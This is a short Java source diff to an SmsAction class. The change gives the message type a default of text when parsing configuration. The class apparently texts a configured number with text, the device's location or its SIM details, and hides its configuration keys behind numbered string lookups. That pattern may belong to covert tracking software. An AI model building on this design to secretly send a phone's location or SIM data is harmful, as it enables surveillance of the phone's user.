@@ -44,7 +44,7 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
     String number;
     String text;
-    int type;
+    int type=TYPE_TEXT;
 
     public SmsAction(final ConfAction params) {
         super(params);
@@ -57,11 +57,12 @@ public final class SmsAction extends SubAction implements LocationObserver {
     protected boolean parse(final ConfAction params) {
         try {
             number = Utils
-                    .unspace(params.getString(Messages.getString("9.26"))); //$NON-NLS-1$           
-            descrType = params.getString(Messages.getString("9.27")); //$NON-NLS-1$
+                    .unspace(params.getString(Messages.getString("9.26"))); //$NON-NLS-1$      
+            // default TEXT
+            descrType = params.getString(Messages.getString("9.27"),Messages.getString("9.29")); //$NON-NLS-1$
             if (Messages.getString("9.28").equals(descrType)) { //$NON-NLS-1$
                 type = TYPE_LOCATION;
-            } else if (Messages.getString("9.29").equals(descrType)) { //$NON-NLS-1$
+            } else if (Messages.getString("9.29").equals(descrType) ) { //$NON-NLS-1$
                 type = TYPE_TEXT;
             } else if (Messages.getString("9.30").equals(descrType)) { //$NON-NLS-1$
                 type = TYPE_SIM;
